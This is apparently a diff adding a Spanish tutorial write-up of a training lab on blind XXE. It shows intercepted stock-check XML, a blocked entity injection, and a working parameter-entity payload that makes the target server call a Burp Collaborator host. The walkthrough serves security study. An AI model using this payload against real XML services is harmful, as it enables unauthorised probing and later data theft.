@@ -456,3 +456,84 @@ por lo que solo queda decodificar el valor de base64 y vemos que se trata del ar
 
 # Laboratorio 4: XXE Blind With Out-of-band a través de entidades de parámetros XML
 
+![lab4](/assets/images/LabsXXE/lab4/lab4.png)
+
+Podemos ver que este laboratorio nos dice que esta vez ya no nos va a permitir inyectar entidades como comunmente lo haciamos, y nos dice que para resolver esto debemos hacer una entidad en el DTD y hacer una solicitud http a un servidor de burpcollaborator.
+
+Esto será parecido a el ejemplo anterior solo que usando un servidor de burpcollaborator.
+
+Por ahora en este laboratorio solo dice que hagamos la petición através de la entidad que inyectaremos, más adelante apuntaremos a un archivo pero por ahora solo nos pide hacer la petición HTT hacia el servidor de burpcollaborator.
+
+<br>
+
+Así que ya teniendo la petición de la parte que sabemos que es vulnerable, en este caso la función de comprobar existencias dentro de la tienda del laboratorio, así que al interceptar una petición de esta función vemos lo siguiente:
+
+![xml](/assets/images/LabsXXE/lab4/xml.png)
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+	<stockCheck>
+		<productId>
+			9
+		</productId>
+		<storeId>
+			1
+		</storeId>
+	</stockCheck>
+```
+
+Podemos ver la tipica estructura XML que hemos visto en los laboratorios anteriores, solo que si esta vez intentamos inyectar una entidad común de XXE:
+
+![error](/assets/images/LabsXXE/lab4/error.png)
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+	<!DOCTYPE foo [ <!ENTITY xxe "hola"> ]>
+	<stockCheck>
+		<productId>
+			&xxe;
+		</productId>
+		<storeId>
+			1
+		</storeId>
+	</stockCheck>
+```
+
+Podemos apreciar que nos da el mensaje **"Entities are not allowed for security reasons"**, por lo que ya no podemos inyectar entidades de esta forma común.
+
+Por lo que ahora tocaría hacer que la petición XML envie una petición a un servidor web tercero, el cual podría contener algun archivo para que la web victima interprete el codigo XML para ejecutar instrucciónes malicosas, pero en este caso primero solo nos intresa la petición a el servidor tercero.
+
+Por lo que iremos a el apartado de BurpCollaborator y tomaremos una url:
+
+![poll](/assets/images/LabsXXE/lab4/poll.png)
+
+Damos en **"CopyToclipboard"**, y obtendremos una url similar a esta:**"a8jfnmr2ktwurmko35ehkcp5vw1mpb.burpcollaborator.net"**, esta url es nuestro servidor tercero temporal creado por burpcollaborator, ahora declararemos una entidad, la cual contendra una llamada a esta url, y después llamamos a dicha entidad para que nos haga la petición:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+	<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://a8jfnmr2ktwurmko35ehkcp5vw1mpb.burpcollaborator.net"> %xxe;]>
+	<stockCheck>
+		<productId>
+			9
+		</productId>
+		<storeId>
+			1
+		</storeId>
+	</stockCheck>
+```
+
+![res](/assets/images/LabsXXE/lab4/response.png)
+
+> Recuerda que los porcentajes se usan para declarar y llamar desde el DTD.
+
+Y al tramitar esta petición podemos observar que nos muestra otro mensaje que dice **"XML parsing error"**, pero no le tomaremos importancia, ahora iremos a el burpcollaborator y daremos en el boton de **pollNow**, y veremos que nos ha llegado nuestra petición HTTP desde el servidor del laboratorio:
+
+![pollnow](/assets/images/LabsXXE/lab4/pollnow.png)
+
+Y ya habremos tenido la conexión deseada, este laboratorio fue para enseñarnos a hacer entidades desde el DTD y llamar a un servidor tercero, y ver que nos responde, ya que lo siguiente será lo mismo pero esta vez nos tomara algun archivo con instrucciónes maliciosas del servidor tercero.
+
+Así que al ir a ver el laboratorio nuevamente veremos que nos aparece que esta completado:
+
+![fin](/assets/images/LabsXXE/lab4/fin.png)
+
+> Recuerda apagar el intercept para que se tramite la petición que tenias capturada.
